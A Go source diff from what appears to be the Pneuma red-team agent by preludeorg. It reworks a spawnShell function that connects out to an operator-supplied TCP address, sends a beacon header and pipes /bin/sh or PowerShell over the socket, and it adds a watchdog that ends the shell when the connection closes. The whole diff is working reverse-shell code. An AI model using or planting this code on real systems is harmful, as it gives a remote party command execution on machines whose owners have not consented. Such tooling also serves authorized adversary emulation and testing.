@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/preludeorg/pneuma/util"
+	"io"
 	"net"
 	"os"
 	"os/exec"
@@ -99,17 +100,35 @@ func spawnShell(target string, agent *util.AgentConfig) (string, int, int) {
 	case "windows":
 		executor = "powershell.exe"
 	default:
-		executor = "/bin/bash"
+		executor = "/bin/sh"
 	}
-	shell := exec.Command(executor)
-	conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
-	shell.Stdout = conn
-	shell.Stdin = conn
-	shell.Stderr = conn
-	if err := shell.Start(); err != nil {
-		return "Error spawning shell", -1, agent.Pid
+	if header, err := agent.BuildSocketBeacon("piped"); err == nil {
+		ctx, cancel := context.WithCancel(context.Background())
+		shell := exec.CommandContext(ctx, executor)
+		conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
+		go cancelOnSocketClose(cancel, conn)
+		conn.Write(header)
+		shell.Stdout = conn
+		shell.Stdin = conn
+		shell.Stderr = conn
+		if err = shell.Start(); err == nil {
+			return "Shell spawned successfully", 0, shell.Process.Pid
+		}
 	}
-	return "Shell spawned successfully", 0, shell.Process.Pid
+	return "Error spawning shell", -1, agent.Pid
+}
+
+func cancelOnSocketClose(cancel context.CancelFunc, conn net.Conn) {
+	for {
+		time.Sleep(time.Duration(30) * time.Second)
+		one := make([]byte, 1)
+		if _, err := conn.Read(one); err == io.EOF {
+			conn.Close()
+			cancel()
+			util.DebugLogf("Closing reverse shell goroutine")
+			return
+		}
+	}
 }
 
 func updateConfiguration(config string, agent *util.AgentConfig) (string, int, int) {
